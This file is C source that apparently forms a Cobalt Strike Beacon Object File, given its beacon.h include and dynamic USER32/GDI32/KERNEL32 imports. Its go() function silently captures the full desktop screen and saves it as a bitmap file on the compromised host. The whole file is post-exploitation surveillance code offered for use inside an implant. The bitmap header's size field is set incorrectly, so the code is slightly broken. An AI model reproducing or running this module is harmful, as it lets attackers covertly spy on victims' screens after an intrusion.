//bof version
#include <windows.h>
#include <string.h>
#include <winuser.h>
#include "beacon.h"

DECLSPEC_IMPORT WINUSERAPI HWND WINAPI USER32$GetDesktopWindow (void);
DECLSPEC_IMPORT WINUSERAPI HDC WINAPI USER32$GetDC (HWND);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$GetWindowRect (HWND, LPRECT);
DECLSPEC_IMPORT WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc (UINT, DWORD);
DECLSPEC_IMPORT WINGDIAPI HDC WINAPI GDI32$CreateCompatibleDC (HDC);
DECLSPEC_IMPORT WINGDIAPI HBITMAP WINAPI GDI32$CreateCompatibleBitmap (HDC, int, int);
DECLSPEC_IMPORT WINGDIAPI HGDIOBJ WINAPI GDI32$SelectObject (HDC, HGDIOBJ);
DECLSPEC_IMPORT WINGDIAPI BOOL WINAPI GDI32$BitBlt (HDC, int, int, int, int, HDC, int, int, DWORD);
DECLSPEC_IMPORT WINGDIAPI int WINAPI GDI32$GetDIBits(HDC,HBITMAP,UINT,UINT,LPVOID,LPBITMAPINFO,UINT);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteFile (HANDLE, PVOID, DWORD, PDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle (HANDLE);
DECLSPEC_IMPORT WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree (HGLOBAL);



 void go() {
     char* BmpName = "Hello.bmp";

	HWND DesktopHwnd = USER32$GetDesktopWindow();
	RECT DesktopParams;
	HDC DevC = USER32$GetDC(DesktopHwnd);
	USER32$GetWindowRect(DesktopHwnd, &DesktopParams);
	DWORD Width = DesktopParams.right - DesktopParams.left;
	DWORD Height = DesktopParams.bottom - DesktopParams.top;

	DWORD FileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (sizeof(RGBTRIPLE) + 1 * (Width * Height * 4));
	char* BmpFileData = (char*)KERNEL32$GlobalAlloc(0x0040, FileSize);

	PBITMAPFILEHEADER BFileHeader = (PBITMAPFILEHEADER)BmpFileData;
	PBITMAPINFOHEADER  BInfoHeader = (PBITMAPINFOHEADER)&BmpFileData[sizeof(BITMAPFILEHEADER)];

	BFileHeader->bfType = 0x4D42; // BM
	BFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
	BFileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	BInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
	BInfoHeader->biPlanes = 1;
	BInfoHeader->biBitCount = 24;
	BInfoHeader->biCompression = BI_RGB;
	BInfoHeader->biHeight = Height;
	BInfoHeader->biWidth = Width;

	RGBTRIPLE* Image = (RGBTRIPLE*)&BmpFileData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];
	RGBTRIPLE color;

	HDC CaptureDC = GDI32$CreateCompatibleDC(DevC);
	HBITMAP CaptureBitmap = GDI32$CreateCompatibleBitmap(DevC, Width, Height);
	GDI32$SelectObject(CaptureDC, CaptureBitmap);
	GDI32$BitBlt(CaptureDC, 0, 0, Width, Height, DevC, 0, 0, SRCCOPY | CAPTUREBLT);
	GDI32$GetDIBits(CaptureDC, CaptureBitmap, 0, Height, Image, (LPBITMAPINFO)BInfoHeader, DIB_RGB_COLORS);

	DWORD Junk;
	HANDLE FH = KERNEL32$CreateFileA(BmpName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
	KERNEL32$WriteFile(FH, BmpFileData, FileSize, &Junk, 0);
	KERNEL32$CloseHandle(FH);
	KERNEL32$GlobalFree(BmpFileData);
 }
